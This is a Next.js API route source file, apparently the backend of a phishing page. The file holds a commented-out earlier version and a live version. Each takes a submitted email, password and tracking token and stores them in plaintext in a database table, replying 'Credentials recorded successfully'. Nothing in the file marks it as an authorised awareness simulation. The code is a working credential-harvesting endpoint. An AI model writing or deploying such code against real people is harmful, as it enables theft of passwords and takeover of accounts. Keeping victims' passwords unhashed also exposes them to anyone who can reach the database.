// //File: app/api/phishing/submit/route.ts
// import { NextResponse } from "next/server";
// import { prisma } from "@/lib/prisma";

// export async function POST(req: Request) {
//   const { email, password, token } = await req.json();

//   if (!email || !password || !token) {
//     return NextResponse.json({ error: "Missing fields" }, { status: 400 });
//   }

//   try {
//     // Store the credentials in the database
//     await prisma.userInteraction.create({
//       data: {
//         email,       // ← You must have added this field in schema.prisma
//         password,
//         token,
//         clickedLink: true,
//       },
//     });

//     return NextResponse.json({ message: "Credentials recorded" });
//   } catch (error) {
//     console.error("[PHISHING_SUBMIT_ERROR]", error);
//     return NextResponse.json({ error: "Server error" }, { status: 500 });
//   }
// }
import { NextResponse } from "next/server"
import { prisma } from "@/lib/prisma"

interface SubmitRequest {
  email: string
  password: string
  token: string
}

interface SubmitResponse {
  message: string
}

export async function POST(req: Request) {
  try {
    const { email, password, token }: SubmitRequest = await req.json()

    if (!email || !password || !token) {
      return NextResponse.json({ error: "Missing required fields" }, { status: 400 })
    }

    // Update the interaction record
    await prisma.userInteraction.updateMany({
      where: { token },
      data: {
        email,
        password,
        clickedLink: true,
      },
    })

    const response: SubmitResponse = {
      message: "Credentials recorded successfully",
    }

    return NextResponse.json(response)
  } catch (error) {
    console.error("[PHISHING_SUBMIT_ERROR]", error)
    return NextResponse.json({ error: "Server error" }, { status: 500 })
  }
}
